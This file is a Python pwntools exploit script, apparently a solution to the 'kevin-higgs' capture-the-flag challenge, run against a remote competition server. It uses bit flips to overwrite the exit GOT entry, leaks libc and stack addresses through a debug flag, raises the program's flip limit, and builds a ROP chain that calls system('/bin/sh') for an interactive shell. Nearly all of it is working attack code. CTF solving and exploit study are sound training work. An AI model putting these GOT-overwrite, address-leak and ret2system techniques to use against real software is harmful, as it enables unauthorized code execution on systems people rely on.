from pwn import *

fname = './kevin-higgs'

context.log_level = "debug"

'''r = process(fname, env={
    "NUMBER_OF_FLIPS": "2"
})'''

r = remote("2020.redpwnc.tf", 31956)

e = ELF(fname)
libc = ELF("libc-2.28.so")


def flip(pos, bit):
    r.sendlineafter("of the byte ", f'{pos:x}')
    r.sendlineafter("of the bit (0 to 7): ", str(bit))
    data = r.recvuntil("Give me").decode("utf8")
    if "[debug]" in data:
        m = re.search(r'your new byte: 0x([0-9a-zA-Z]{2})\n', data)

        returned = int(m.group(1), 16)
        original = returned ^ (1 << bit)

        log.debug(f'0x{pos:08x}: 0x{original:02x} -> 0x{returned:02x}')

        return original


def change_addr_val(addr, cur, target):
    flips = 0
    for i in range(32):
        byte_offset = i // 8

        # if bits differ, flip
        if (cur ^ target) & (1 << i):
            flip(addr + byte_offset, i % 8)
            flips += 1

    return flips


# for p in itertools.combinations(list(range(12)), 2):
#     address = 0x08049086 ^ ((1 << p[0]) | (1 << p[1]))
#     log.info(f'addr={hex(address)}')
#     log.info(disasm(r.leak(address, 64)))

# flip 08049086 into 080490d6, infinite wishes!
flip(e.got["exit"], 6)
flip(e.got["exit"], 4)

addr_debug = 0x804c090

# enable debug
flip(addr_debug, 0)
# flip a second time just to end this round
flip(addr_debug, 1)


def leak_u32(addr):
    leaked = bytearray()
    for i in range(4):
        leaked.append(flip(addr + i, 0))
        flip(addr + i, 0)

    return u32(leaked)


addr_setvbuf = leak_u32(e.got["setvbuf"])

log.info(f'setvbuf@got: {addr_setvbuf:08x}')

libc.address = addr_setvbuf - libc.symbols["setvbuf"]

log.info(f'libc base: {libc.address:08x}')

# leak address of environ, which is on the stack
addr_environ = leak_u32(libc.symbols["environ"])

log.info(f'environ: {addr_environ:08x}')

# at this point, by breaking and checking the stack in gdb, the variable controlling
# max number of flips is at address environ - 0xad8

bitflip = 6
# we flip the 6th bit so we now have 0x42 flips (minus one because we used one to actually flip the 6th bit)
flip(addr_environ - 0xad8, bitflip)

flips = (0x2 | (1 << bitflip)) - 1

addr_binsh = next(libc.search(b"/bin/sh"))
addr_system = libc.symbols["system"]

# flip(addr_environ - 0xafc, 7)
# flip(addr_environ - 0xaf8, 7)
# flip(addr_environ - 0xaf4, 7)
# flip(addr_environ - 0xaf0, 0)

# flips -= 3

# 0x080494ad : add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
# modify exit@got.plt to 0x080494ad

flips -= change_addr_val(e.got["exit"], cur=0x080490d6, target=0x080494ad)

# after stack items are cleared from the gadget above, the next 2 stack elements
# are treated as ip, ret address, arg0 respectively
addr_ip = addr_environ - 0xaf4
addr_param = addr_environ - 0xaec

flips -= change_addr_val(addr_ip, cur=leak_u32(addr_ip), target=addr_system)
flips -= change_addr_val(addr_param, cur=leak_u32(addr_param), target=addr_binsh)

flips -= 2 * 8  # 8 flips used to leak a 32 bit value

log.info(f'{flips} flips remaining')
while flips > 1:
    flip(addr_debug, 7)
    flips -= 1
    log.info(flips)

# one last flip to make before we hit exit
pos = 0x804c090
bit = 7
r.sendlineafter("of the byte ", f'{pos:x}')
r.sendlineafter("of the bit (0 to 7): ", str(bit))

r.interactive()
